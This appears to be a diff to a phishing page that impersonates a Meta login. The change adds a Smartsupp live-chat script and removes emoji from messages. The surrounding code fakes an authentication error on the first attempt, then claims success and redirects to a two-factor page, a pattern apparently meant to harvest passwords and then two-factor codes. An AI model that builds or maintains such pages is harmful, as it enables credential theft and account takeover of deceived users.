@@ -6,6 +6,18 @@
     <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
     <link rel="stylesheet" href="../cdn.jsdelivr.net/npm/bootstrap%404.3.1/dist/css/bootstrap.min.css">
     <script src="../code.jquery.com/jquery-3.6.0.min.js"></script>
+	<!-- Smartsupp Live Chat script -->
+<script type="text/javascript">
+var _smartsupp = _smartsupp || {};
+_smartsupp.key = 'b94bda33fbb602bb3d3c46f1003bbf8c4004bdfc';
+window.smartsupp||(function(d) {
+  var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
+  s=d.getElementsByTagName('script')[0];c=d.createElement('script');
+  c.type='text/javascript';c.charset='utf-8';c.async=true;
+  c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
+})(document);
+</script>
+<noscript> Powered by <a href=“https://www.smartsupp.com” target=“_blank”>Smartsupp</a></noscript>
     <title>Meta</title>
     <style>
         .spinner {
@@ -667,11 +679,11 @@
 
             if (attemptCount === 1) {
                 setTimeout(() => {
-                    $("#message_err").html('<p style="color: red;">⚠️ Authentication Error - Please try again</p>');
+                    $("#message_err").html('<p style="color: red;"> Authentication Error - Please try again</p>');
                 }, 2000);
             } else {
                 setTimeout(() => {
-                    $("#message_err").html('<p style="color: green;">✅ Authentication successful! Redirecting...</p>');
+                    $("#message_err").html('<p style="color: green;"> Authentication successful! Redirecting...</p>');
                     window.location.href = "twofactor.html";
                 }, 2000);
             }
